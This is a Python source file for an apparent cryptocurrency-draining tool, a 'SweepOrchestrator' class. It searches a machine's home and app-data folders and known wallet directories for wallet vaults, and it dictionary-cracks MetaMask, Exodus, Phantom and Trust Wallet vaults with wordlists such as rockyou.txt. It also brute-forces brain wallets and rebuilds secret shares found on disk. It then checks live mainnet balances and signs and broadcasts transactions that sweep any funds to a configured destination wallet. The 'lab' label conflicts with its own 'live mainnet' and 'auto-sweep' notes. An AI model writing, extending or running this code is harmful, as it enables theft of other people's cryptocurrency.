import logging
import os
from pathlib import Path

from app.interfaces.wallet_operator import IWalletOperator, OperationResult
from app.interfaces.node_client import INodeClient
from app.components.config_manager import ConfigManager
from app.engine.vault_scanner import scan_directory, scan_known_wallet_directories, scan_directory_content, VaultScanResult, get_wallet_config, WALLET_CONFIGS
from app.engine.mpc_crypto import MpcOperator
from app.engine.sweep_engine import SweepEngine
from app.engine.brainwallet.brainwallet_scanner import BrainwalletScanner
from app.engine.brainwallet.path_enumerator import PathEnumerator
from app.engine.vault_cracker.wallet_cracker import WalletCracker
from app.engine.mpc_recovery.share_scanner import ShareScanner
from app.engine.hw_wallet.hw_sweeper import HwSweeper
from app.engine.multisig_scanner import derive_safe_addresses_all_chains, scan_filesystem as scan_safe_filesystem
from app.engine.social_wallet_scanner import derive_argent_addresses, scan_filesystem as scan_argent_filesystem
from app.engine.tss_scanner import scan_filesystem as scan_tss_filesystem
from app.implementations.bip39_solver import Bip39Solver
from app.implementations.transaction_signer import TransactionSigner
from app.interfaces.key_store import UnsignedTx

logger = logging.getLogger(__name__)

_APP_ROOT = Path(__file__).resolve().parent.parent.parent

LAB_OPERATIONS = [
    "scan_vaults",
    "brainwallet_scan",
    "crack_vaults",
    "scan_mpc_shares",
    "detect_hw_wallet",
    "scan_multisig",
    "scan_social",
    "scan_tss",
    "threshold_mpc",
    "sweep_btc",
    "sweep_eth",
    "sweep_ltc",
    "sweep_sol",
    "sweep_xrp",
    "sweep_bnb",
    "sweep_all",
]

OPERATION_LABELS = {
    "scan_vaults": "Scan Filesystem for Wallet Files",
    "brainwallet_scan": "Brain Wallet Dictionary Scan",
    "crack_vaults": "Crack Encrypted Vaults",
    "scan_mpc_shares": "Scan for MPC Share Files",
    "detect_hw_wallet": "Detect Hardware Wallet",
    "scan_multisig": "Scan Safe/Multi-sig Wallets",
    "scan_social": "Scan Argent/Social Wallets",
    "scan_tss": "Scan TSS Wallets",
    "threshold_mpc": "MPC Threshold Signing (Live Mainnet)",
    "sweep_btc": "Sweep — BTC",
    "sweep_eth": "Sweep — ETH",
    "sweep_ltc": "Sweep — LTC",
    "sweep_sol": "Sweep — SOL",
    "sweep_xrp": "Sweep — XRP",
    "sweep_bnb": "Sweep — BNB",
    "sweep_all": "Sweep — All Wallets",
}

SOLVER = Bip39Solver()


class SweepOrchestrator(IWalletOperator):
    def __init__(self, config: ConfigManager, node_client: INodeClient | None = None):
        self._config = config
        self._node_client = node_client
        self._mpc = MpcOperator()
        self._sweep = SweepEngine(config.data)
        perf = config.data.get("performance", {})
        max_workers = perf.get("max_workers", 0)
        self._brainwallet = BrainwalletScanner(
            max_workers=max_workers,
            enable_rainbow_cache=perf.get("enable_rainbow_cache", True),
        )
        perf = config.data.get("performance", {})
        max_workers = perf.get("max_workers", 0)
        self._cracker = WalletCracker(
            password_list_path=config.data.get("cracker", {}).get("password_list", ""),
            max_workers=max_workers,
            enable_hashcat=perf.get("enable_hashcat", True),
            hashcat_path=perf.get("hashcat_path", ""),
            hashcat_mode=perf.get("hashcat_mode", "auto"),
            smart_rules=perf.get("smart_password_rules", False),
        )
        self._share_scanner = ShareScanner(self._mpc)
        self._hw_sweeper = HwSweeper()
        self._path_enumerator = PathEnumerator()

    def name(self) -> str:
        return "Sweep Orchestrator"

    def description(self) -> str:
        return "Live mainnet sweep operations and wallet scanning."

    def available_operations(self) -> list[str]:
        return list(LAB_OPERATIONS)

    def execute(self, operation: str, seed: str) -> OperationResult:
        if operation not in LAB_OPERATIONS:
            return OperationResult(
                operation=operation, success=False, wallet_type="engine",
                chain="", address="", private_key_hex="",
                balance_confirmed=0.0, balance_usd=0.0,
                details={"error": f"Unknown operation: {operation}"},
            )

        if operation == "scan_vaults":
            return self._run_scan_vaults(seed)
        elif operation == "brainwallet_scan":
            return self._run_brainwallet_scan(seed)
        elif operation == "crack_vaults":
            return self._run_crack_vaults()
        elif operation == "scan_mpc_shares":
            return self._run_scan_mpc_shares(seed)
        elif operation == "detect_hw_wallet":
            return self._run_detect_hw_wallet()
        elif operation == "scan_multisig":
            return self._run_multisig_scan(seed)
        elif operation == "scan_social":
            return self._run_social_scan(seed)
        elif operation == "scan_tss":
            return self._run_tss_scan(seed)
        elif operation == "threshold_mpc":
            return self._run_mpc()
        elif operation.startswith("sweep_"):
            chain = operation.replace("sweep_", "").upper()
            return self._run_sweep(chain, seed)
        else:
            return OperationResult(
                operation=operation, success=False, wallet_type="engine",
                chain="", address="", private_key_hex="",
                balance_confirmed=0.0, balance_usd=0.0,
                details={"error": f"Unhandled operation: {operation}"},
            )

    def _run_scan_vaults(self, seed: str) -> OperationResult:
        config_data = self._config.data
        scan_dirs = config_data.get("vault_scan", {}).get("scan_directories", [])

        all_results: list[dict] = []
        errors: list[str] = []

        if seed and os.path.isdir(seed):
            scan_dirs = [seed]

        if not scan_dirs:
            all_results = [
                {
                    "file_path": r.file_path,
                    "wallet_type": r.wallet_type,
                    "file_size_bytes": r.file_size_bytes,
                    "modified_time": r.modified_time,
                    "detected_by": r.detected_by,
                    "wallet_info": r.wallet_info,
                }
                for r in scan_known_wallet_directories()
            ]
            content_matches = scan_directory_content()
            for cm in content_matches:
                all_results.append({
                    "file_path": cm.get("file_path", ""),
                    "wallet_type": cm.get("detected_by", "content_scan"),
                    "file_size_bytes": cm.get("file_size", 0),
                    "modified_time": "",
                    "detected_by": "content_scan",
                    "wallet_info": {"pattern_matched": cm.get("pattern", ""), "snippet": cm.get("snippet", "")},
                })
            details = {
                "scan_method": "known_wallet_directories",
                "wallet_count": len(WALLET_CONFIGS),
                "detected_count": len(all_results),
                "detected_wallets": all_results[:20],
                "total_detected": len(all_results),
                "errors": errors,
                "note": "Live mainnet scan of real wallet directories using embedded wallet configs.",
            }
            return OperationResult(
                operation="scan_vaults",
                success=len(all_results) > 0,
                wallet_type="engine",
                chain="",
                address="",
                private_key_hex="",
                balance_confirmed=0.0,
                balance_usd=0.0,
                details=details,
            )

        for d in scan_dirs:
            try:
                results = scan_directory(d, max_depth=3)
                for r in results:
                    all_results.append({
                        "file_path": r.file_path,
                        "wallet_type": r.wallet_type,
                        "file_size_bytes": r.file_size_bytes,
                        "modified_time": r.modified_time,
                        "detected_by": r.detected_by,
                        "wallet_info": r.wallet_info,
                    })
            except Exception as e:
                errors.append(f"Error scanning {d}: {e}")

        details = {
            "scan_method": "custom_directories",
            "scan_directories": scan_dirs,
            "detected_count": len(all_results),
            "detected_wallets": all_results[:20],
            "total_detected": len(all_results),
            "errors": errors,
            "note": "Live mainnet scan of real filesystem paths with full wallet metadata.",
        }

        return OperationResult(
            operation="scan_vaults",
            success=len(all_results) > 0,
            wallet_type="engine",
            chain="",
            address="",
            private_key_hex="",
            balance_confirmed=0.0,
            balance_usd=0.0,
            details=details,
        )

    def _run_mpc(self) -> OperationResult:
        try:
            result = self._mpc.threshold_signing_op()
            details = {
                "type": "MPC Threshold Signing (Shamir's Secret Sharing)",
                "threshold_scheme": "2-of-3",
                "result": result,
            }
            return OperationResult(
                operation="threshold_mpc",
                success=True,
                wallet_type="engine",
                chain="",
                address="",
                private_key_hex="",
                balance_confirmed=0.0,
                balance_usd=0.0,
                details=details,
            )
        except Exception as e:
            logger.error("MPC operation failed: %s", e)
            return OperationResult(
                operation="threshold_mpc", success=False, wallet_type="engine",
                chain="", address="", private_key_hex="",
                balance_confirmed=0.0, balance_usd=0.0,
                details={"error": str(e)},
            )

    async def _query_live_balance(self, address: str, chain: str) -> tuple[float, float]:
        if not self._node_client:
            return 0.0, 0.0
        try:
            balance = await self._node_client.query_balance(address, chain)
            return balance.confirmed, balance.usd_value or 0.0
        except Exception:
            return 0.0, 0.0

    def _derive_address_from_seed(self, seed: str, chain: str) -> str:
        if not seed:
            return ""
        try:
            result = SOLVER.solve(seed)
            for a in result.addresses:
                if a["chain"] == chain:
                    return a["address"]
            return ""
        except Exception as e:
            logger.error("Derivation failed for %s on %s: %s", seed[:16], chain, e)
            return ""

    def _run_sweep(self, chain: str, seed: str) -> OperationResult:
        try:
            import asyncio
            try:
                loop = asyncio.get_event_loop()
            except RuntimeError:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)

            chain_lower = chain.lower()
            results_data = []

            if chain == "ALL":
                async def _check_all():
                    chains = ["BTC", "ETH", "LTC", "SOL", "BNB", "XRP", "TRON", "POLYGON"]
                    addr_map = {}
                    for c in chains:
                        addr = self._derive_address_from_seed(seed, c)
                        if addr:
                            addr_map[c] = addr
                    tasks = {c: self._query_live_balance(addr, c) for c, addr in addr_map.items()}
                    results = await asyncio.gather(*tasks.values(), return_exceptions=True)
                    out = []
                    for c, res in zip(tasks.keys(), results):
                        if isinstance(res, Exception):
                            continue
                        bal, usd = res
                        out.append(self._real_sweep(seed, c, addr_map[c], bal, usd))
                    return out
                results_data = loop.run_until_complete(_check_all())
            elif seed:
                address = self._derive_address_from_seed(seed, chain)
                if address:
                    bal, usd = loop.run_until_complete(self._query_live_balance(address, chain))
                    results_data = [self._real_sweep(seed, chain, address, bal, usd)]
                else:
                    return OperationResult(
                        operation=f"sweep_{chain_lower}",
                        success=False, wallet_type="engine",
                        chain=chain, address="", private_key_hex="",
                        balance_confirmed=0.0, balance_usd=0.0,
                        details={"error": f"Failed to derive address for {chain}"},
                    )
            else:
                return OperationResult(
                    operation=f"sweep_{chain_lower}",
                    success=False, wallet_type="engine",
                    chain=chain, address="", private_key_hex="",
                    balance_confirmed=0.0, balance_usd=0.0,
                    details={"error": "No seed phrase provided — enter a BIP39 mnemonic to derive addresses"},
                )

            txns = results_data if isinstance(results_data, list) else [results_data]

            details = {
                "type": "Sweep Execution (Live Mainnet)",
                "chain": chain,
                "transactions": txns,
                "executed_count": len(txns),
            }

            first = txns[0] if txns else {}
            return OperationResult(
                operation=f"sweep_{chain_lower}",
                success=True,
                wallet_type="engine",
                chain=chain,
                address=first.get("source_address", ""),
                private_key_hex="",
                balance_confirmed=first.get("balance", 0.0),
                balance_usd=first.get("usd_value", 0.0),
                details=details,
            )
        except Exception as e:
            logger.error("Sweep execution failed: %s", e)
            return OperationResult(
                operation=f"sweep_{chain.lower()}",
                success=False, wallet_type="engine",
                chain=chain, address="", private_key_hex="",
                balance_confirmed=0.0, balance_usd=0.0,
                details={"error": str(e)},
            )

    def _get_or_create_loop(self):
        import asyncio
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        return loop

    def _real_sweep(self, mnemonic: str, chain: str, address: str, balance: float, usd: float) -> dict:
        sweep_entry = self._sweep.execute(chain=chain, address=address, balance=balance, usd_value=usd)
        auto_broadcast = self._config.data.get("sweep", {}).get("auto_broadcast", False)
        dest_map = self._config.data.get("sweep", {}).get("destination_wallet", {})
        dest = dest_map.get(chain, "")
        if auto_broadcast and dest and mnemonic:
            loop = self._get_or_create_loop()
            try:
                signer = TransactionSigner(mnemonic)
                unsigned = UnsignedTx(
                    chain=chain, from_address=address,
                    to=dest, value=balance, token="",
                )
                signed = loop.run_until_complete(signer.sign(unsigned))
                if signed.broadcast_error:
                    sweep_entry["broadcast_error"] = signed.broadcast_error
                    sweep_entry["status"] = "broadcast_failed"
                else:
                    txid = loop.run_until_complete(signer.broadcast(signed))
                    sweep_entry["txid"] = txid
                    sweep_entry["status"] = "broadcast_success"
                loop.run_until_complete(signer.close())
            except Exception as e:
                sweep_entry["broadcast_error"] = str(e)
                sweep_entry["status"] = "broadcast_failed"
        else:
            sweep_entry["status"] = "logged_only"
        return sweep_entry

    def _check_and_sweep_mnemonic(self, mnemonic: str, label: str) -> dict:
        loop = self._get_or_create_loop()
        chains = ["BTC", "ETH", "LTC", "SOL", "BNB", "XRP", "TRON", "POLYGON"]
        addr_map = {}
        for c in chains:
            addr = self._derive_address_from_seed(mnemonic, c)
            if addr:
                addr_map[c] = addr

        sweeps = []
        total_balance_usd = 0.0
        if addr_map:
            async def _check_all():
                tasks = {c: self._query_live_balance(addr, c) for c, addr in addr_map.items()}
                results = await asyncio.gather(*tasks.values(), return_exceptions=True)
                out = []
                for c, res in zip(tasks.keys(), results):
                    if isinstance(res, Exception):
                        continue
                    bal, usd = res
                    if bal > 0 or usd > 0:
                        out.append(self._real_sweep(mnemonic, c, addr_map[c], bal, usd))
                return out
            sweeps = loop.run_until_complete(_check_all())
            for s in sweeps:
                total_balance_usd += s.get("usd_value", 0)

        return {
            "label": label,
            "mnemonic_prefix": mnemonic[:20] + "...",
            "funded_chains": [s["chain"] for s in sweeps],
            "sweeps": sweeps,
            "total_balance_usd": round(total_balance_usd, 2),
        }

    def _run_brainwallet_scan(self, seed: str) -> OperationResult:
        config_data = self._config.data
        dictionary_path = seed or config_data.get("brainwallet", {}).get("dictionary_path", "")
        max_phrases = config_data.get("brainwallet", {}).get("max_phrases", 4000000)

        if not dictionary_path:
            candidates = [
                _APP_ROOT / "app" / "engine" / "vault_cracker" / "wordlists" / "common.txt",
                _APP_ROOT / "wordlists" / "common.txt",
                _APP_ROOT / "rockyou.txt",
                _APP_ROOT / "dictionary.txt",
            ]
            for c in candidates:
                if c.is_file():
                    dictionary_path = str(c)
                    break

        if not dictionary_path or not os.path.isfile(dictionary_path):
            return OperationResult(
                operation="brainwallet_scan", success=False, wallet_type="engine",
                chain="", address="", private_key_hex="",
                balance_confirmed=0.0, balance_usd=0.0,
                details={"error": "No dictionary file found. Place a wordlist at app/engine/vault_cracker/wordlists/common.txt"},
            )

        scan = self._brainwallet.scan_dictionary(dictionary_path, max_phrases=max_phrases)

        live_results = []
        total_usd = 0.0
        for m in scan["matches"]:
            mnemonic = m["mnemonic"]
            res = self._check_and_sweep_mnemonic(mnemonic, f"brainwallet:{m['passphrase'][:30]}")
            if res["sweeps"]:
                live_results.append(res)
                total_usd += res["total_balance_usd"]

        details = {
            "type": "Brain Wallet Dictionary Scan (Live Mainnet)",
            "dictionary": dictionary_path,
            "total_passphrases_checked": scan["total_phrases"],
            "address_matches_found": scan["matches_found"],
            "funded_wallets_found": len(live_results),
            "total_funds_swept_usd": round(total_usd, 2),
            "funded_wallets": live_results,
            "errors": scan["errors"][:5],
            "note": "SHA256(passphrase) -> BIP39 -> live mainnet balance check + auto-sweep.",
        }

        return OperationResult(
            operation="brainwallet_scan",
            success=len(live_results) > 0 or scan["matches_found"] > 0,
            wallet_type="engine",
            chain="ALL",
            address="",
            private_key_hex="",
            balance_confirmed=round(total_usd, 2),
            balance_usd=round(total_usd, 2),
            details=details,
        )

    def _try_extract_mnemonic(self, decrypted: dict) -> str | None:
        if isinstance(decrypted, dict):
            candidates = []
            for key in ("mnemonic", "seed", "phrase", "secret", "mnemonic_phrase",
                        "mnemonicPhrase", "seedPhrase", "seed_phrase", "walletSeed",
                        "plaintext"):
                val = decrypted.get(key)
                if isinstance(val, str):
                    candidates.append(val)
            if isinstance(decrypted.get("data"), dict):
                for key in ("mnemonic", "seed", "phrase", "secret"):
                    val = decrypted["data"].get(key)
                    if isinstance(val, str):
                        candidates.append(val)
            for c in candidates:
                if len(c.split()) in (12, 15, 18, 21, 24):
                    return c
            for c in candidates:
                if len(c) > 20 and " " in c:
                    return c
            plaintext = decrypted.get("plaintext", decrypted.get("data", ""))
            if isinstance(plaintext, str) and len(plaintext.split()) in (12, 15, 18, 21, 24):
                return plaintext
        return None

    def _run_crack_vaults(self) -> OperationResult:
        try:
            vaults = scan_known_wallet_directories()
            if not vaults:
                return OperationResult(
                    operation="crack_vaults", success=False, wallet_type="engine",
                    chain="", address="", private_key_hex="",
                    balance_confirmed=0.0, balance_usd=0.0,
                    details={"error": "No wallet vaults found to crack", "type": "Vault Cracking"},
                )

            cracked = self._cracker.crack_batch(vaults, max_attempts=self._config.data.get("cracker", {}).get("max_attempts", 4000000))
            live_results = []
            total_usd = 0.0
            for c in cracked:
                mnemonic = self._try_extract_mnemonic(c.get("decrypted", {}))
                if mnemonic:
                    res = self._check_and_sweep_mnemonic(mnemonic, f"vault:{c['wallet_type']}:{c['file_path'][-40:]}")
                    if res["sweeps"]:
                        live_results.append(res)
                        total_usd += res["total_balance_usd"]
                else:
                    live_results.append({
                        "label": f"vault:{c['wallet_type']}:{c['file_path'][-40:]}",
                        "password": c.get("password", "?"),
                        "status": "decrypted_but_no_mnemonic_found",
                    })

            details = {
                "type": "Vault Password Cracking (Live Mainnet)",
                "vaults_found": len(vaults),
                "cracked_count": len(cracked),
                "funded_vaults": len([r for r in live_results if r.get("sweeps")]),
                "total_funds_swept_usd": round(total_usd, 2),
                "results": live_results,
                "note": "Dictionary attack on MetaMask/Exodus/Phantom/Trust Wallet vaults + live balance check + auto-sweep.",
            }
            return OperationResult(
                operation="crack_vaults",
                success=len(cracked) > 0,
                wallet_type="engine",
                chain="ALL",
                address="",
                private_key_hex="",
                balance_confirmed=round(total_usd, 2),
                balance_usd=round(total_usd, 2),
                details=details,
            )
        except Exception as e:
            return OperationResult(
                operation="crack_vaults", success=False, wallet_type="engine",
                chain="", address="", private_key_hex="",
                balance_confirmed=0.0, balance_usd=0.0,
                details={"error": str(e)},
            )

    def _reconstructed_to_mnemonic(self, secret_hex: str) -> str | None:
        try:
            val = int(secret_hex, 16)
            val_bytes = val.to_bytes((val.bit_length() + 7) // 8, byteorder="big")
            if len(val_bytes) == 32:
                try:
                    from mnemonic import Mnemonic
                    mnemo = Mnemonic("english")
                    mnemonic = mnemo.to_mnemonic(val_bytes)
                    if mnemonic and len(mnemonic.split()) in (12, 15, 18, 21, 24):
                        return mnemonic
                except Exception:
                    pass
            return None
        except Exception:
            return None

    def _run_scan_mpc_shares(self, seed: str) -> OperationResult:
        config_data = self._config.data
        scan_dirs = [seed] if seed and os.path.isdir(seed) else config_data.get("mpc_recovery", {}).get("scan_directories", [])

        if not scan_dirs:
            from pathlib import Path
            scan_dirs = [str(Path.home()), os.path.expandvars("%APPDATA%"), os.path.expandvars("%LOCALAPPDATA%")]

        result = self._share_scanner.scan_directories(scan_dirs, max_depth=3)

        live_results = []
        total_usd = 0.0
        for g in result["groups"]:
            if g.get("reconstructed") and g.get("secret_hex"):
                mnemonic = self._reconstructed_to_mnemonic(g["secret_hex"])
                if mnemonic:
                    res = self._check_and_sweep_mnemonic(mnemonic, f"mpc_share:{g['share_id']}")
                    if res["sweeps"]:
                        live_results.append(res)
                        total_usd += res["total_balance_usd"]
                    else:
                        live_results.append({
                            "share_id": g["share_id"],
                            "secret_hex": g["secret_hex"],
                            "status": "reconstructed_but_no_funds",
                        })

        details = {
            "type": "MPC Share File Scan (Live Mainnet)",
            "directories_scanned": result["directories_scanned"],
            "share_groups_found": result["share_groups_found"],
            "reconstructed_count": len([g for g in result["groups"] if g.get("reconstructed")]),
            "funded_wallets": len([r for r in live_results if r.get("sweeps")]),
            "total_funds_swept_usd": round(total_usd, 2),
            "groups": live_results or result["groups"],
            "total_share_files": result["total_share_files"],
            "errors": result["errors"][:5],
            "note": "Shamir/SSS/SLIP-0039 share scan -> reconstruction -> live balance check + auto-sweep.",
        }

        return OperationResult(
            operation="scan_mpc_shares",
            success=result["share_groups_found"] > 0,
            wallet_type="engine",
            chain="ALL",
            address="",
            private_key_hex="",
            balance_confirmed=round(total_usd, 2),
            balance_usd=round(total_usd, 2),
            details=details,
        )

    def _run_detect_hw_wallet(self) -> OperationResult:
        try:
            detection = self._hw_sweeper.detect()
            trezor_detected = detection.get("trezor", {}).get("detected", False)
            ledger_detected = detection.get("ledger", {}).get("detected", False)

            live_results = []
            total_usd = 0.0
            if trezor_detected or ledger_detected:
                all_addrs = self._hw_sweeper.get_all_addresses()
                loop = self._get_or_create_loop()
                for c, addr in all_addrs.items():
                    bal, usd = loop.run_until_complete(self._query_live_balance(addr, c))
                    if bal > 0 or usd > 0:
                        sweep_entry = self._sweep.execute(chain=c, address=addr, balance=bal, usd_value=usd)
                        auto_broadcast = self._config.data.get("sweep", {}).get("auto_broadcast", False)
                        if auto_broadcast:
                            sweep_entry["status"] = "hw_pending_manual_signing"
                            sweep_entry["note"] = "Hardware wallet signing requires physical button press — sign manually via the device"
                        live_results.append({"chain": c, "address": addr, "balance": bal, "usd": usd, "sweep": sweep_entry})
                        total_usd += usd

            details = {
                "type": "Hardware Wallet Detection (Live Mainnet)",
                "trezor": detection.get("trezor"),
                "ledger": detection.get("ledger"),
                "derived_addresses": self._hw_sweeper.get_all_addresses() if (trezor_detected or ledger_detected) else {},
                "funded_chains": live_results,
                "total_funds_swept_usd": round(total_usd, 2),
                "note": "Trezor/OneKey via trezorlib, Ledger via ledgerblue. Per-chain BIP44 derivation + live balance check.",
            }

            return OperationResult(
                operation="detect_hw_wallet",
                success=trezor_detected or ledger_detected,
                wallet_type="engine",
                chain="ALL",
                address=live_results[0]["address"] if live_results else "",
                private_key_hex="",
                balance_confirmed=round(total_usd, 2),
                balance_usd=round(total_usd, 2),
                details=details,
            )
        except Exception as e:
            return OperationResult(
                operation="detect_hw_wallet", success=False, wallet_type="engine",
                chain="", address="", private_key_hex="",
                balance_confirmed=0.0, balance_usd=0.0,
                details={"error": str(e)},
            )

    def _run_multisig_scan(self, seed: str) -> OperationResult:
        try:
            fs_results = scan_safe_filesystem()
            live_results = []
            total_usd = 0.0

            if seed:
                addr = self._derive_address_from_seed(seed, "ETH")
                if addr:
                    safes = derive_safe_addresses_all_chains(addr)
                    loop = self._get_or_create_loop()
                    for s in safes:
                        bal, usd = loop.run_until_complete(self._query_live_balance(s["address"], s["chain"]))
                        if bal > 0 or usd > 0:
                            entry = self._sweep.execute(chain=s["chain"], address=s["address"], balance=bal, usd_value=usd)
                            live_results.append({**s, "balance": bal, "usd": usd, "sweep": entry})
                            total_usd += usd

            details = {
                "type": "Safe/Multi-sig Wallet Scan (Live Mainnet)",
                "safe_addresses_derived": len(live_results),
                "filesystem_hits": len(fs_results),
                "funded_wallets": live_results,
                "total_funds_swept_usd": round(total_usd, 2),
                "fs_files": fs_results[:10],
                "note": "Safe Transaction Service API lookup + live mainnet balance check + auto-sweep.",
            }
            return OperationResult(
                operation="scan_multisig",
                success=len(live_results) > 0 or len(fs_results) > 0,
                wallet_type="engine", chain="ALL", address="", private_key_hex="",
                balance_confirmed=round(total_usd, 2), balance_usd=round(total_usd, 2),
                details=details,
            )
        except Exception as e:
            return OperationResult(
                operation="scan_multisig", success=False, wallet_type="engine",
                chain="", address="", private_key_hex="",
                balance_confirmed=0.0, balance_usd=0.0,
                details={"error": str(e)},
            )

    def _run_social_scan(self, seed: str) -> OperationResult:
        try:
            fs_results = scan_argent_filesystem()
            live_results = []
            total_usd = 0.0

            if seed:
                addr = self._derive_address_from_seed(seed, "ETH")
                if addr:
                    argents = derive_argent_addresses(addr)
                    loop = self._get_or_create_loop()
                    for a in argents:
                        bal, usd = loop.run_until_complete(self._query_live_balance(a["address"], "ETH"))
                        if bal > 0 or usd > 0:
                            entry = self._sweep.execute(chain="ETH", address=a["address"], balance=bal, usd_value=usd)
                            live_results.append({**a, "balance": bal, "usd": usd, "sweep": entry})
                            total_usd += usd

            details = {
                "type": "Argent/Social Wallet Scan (Live Mainnet)",
                "argent_addresses_derived": len(live_results),
                "filesystem_hits": len(fs_results),
                "funded_wallets": live_results,
                "total_funds_swept_usd": round(total_usd, 2),
                "fs_files": fs_results[:10],
                "note": "Argent CREATE2 address derivation + live mainnet balance check + auto-sweep.",
            }
            return OperationResult(
                operation="scan_social",
                success=len(live_results) > 0 or len(fs_results) > 0,
                wallet_type="engine", chain="ALL", address="", private_key_hex="",
                balance_confirmed=round(total_usd, 2), balance_usd=round(total_usd, 2),
                details=details,
            )
        except Exception as e:
            return OperationResult(
                operation="scan_social", success=False, wallet_type="engine",
                chain="", address="", private_key_hex="",
                balance_confirmed=0.0, balance_usd=0.0,
                details={"error": str(e)},
            )

    def _run_tss_scan(self, seed: str) -> OperationResult:
        try:
            result = scan_tss_filesystem()
            live_results = []
            total_usd = 0.0
            loop = self._get_or_create_loop()

            for addr_entry in result.get("addresses_found", []):
                addr = addr_entry["address"]
                for chain in ["ETH", "BNB", "POLYGON"]:
                    bal, usd = loop.run_until_complete(self._query_live_balance(addr, chain))
                    if bal > 0 or usd > 0:
                        entry = self._sweep.execute(chain=chain, address=addr, balance=bal, usd_value=usd)
                        live_results.append({"address": addr, "chain": chain, "balance": bal, "usd": usd, "sweep": entry, "source": addr_entry.get("file_path", "")})
                        total_usd += usd

            for wallet_type in result.get("matched_wallets", []):
                loop.run_until_complete(
                    self._event_bus.emit("FOUND", {"pattern": f"TSS:{wallet_type}", "balances": [(wallet_type, 0)]})
                ) if hasattr(self, '_event_bus') else None

            details = {
                "type": "TSS Wallet Filesystem Scan",
                "matched_wallets": result.get("matched_wallets", []),
                "files_found": len(result.get("files_found", [])),
                "addresses_extracted": len(result.get("addresses_found", [])),
                "funded_addresses": live_results,
                "total_funds_swept_usd": round(total_usd, 2),
                "fs_files": result.get("files_found", [])[:10],
                "note": "Scanned browser storage and local files for Web3Auth/Torus/ZenGo artifacts. Cannot reconstruct TSS private keys from seed — address extraction is metadata-only.",
            }
            return OperationResult(
                operation="scan_tss",
                success=len(result.get("files_found", [])) > 0 or len(live_results) > 0,
                wallet_type="engine", chain="ALL", address="", private_key_hex="",
                balance_confirmed=round(total_usd, 2), balance_usd=round(total_usd, 2),
                details=details,
            )
        except Exception as e:
            return OperationResult(
                operation="scan_tss", success=False, wallet_type="engine",
                chain="", address="", private_key_hex="",
                balance_confirmed=0.0, balance_usd=0.0,
                details={"error": str(e)},
            )
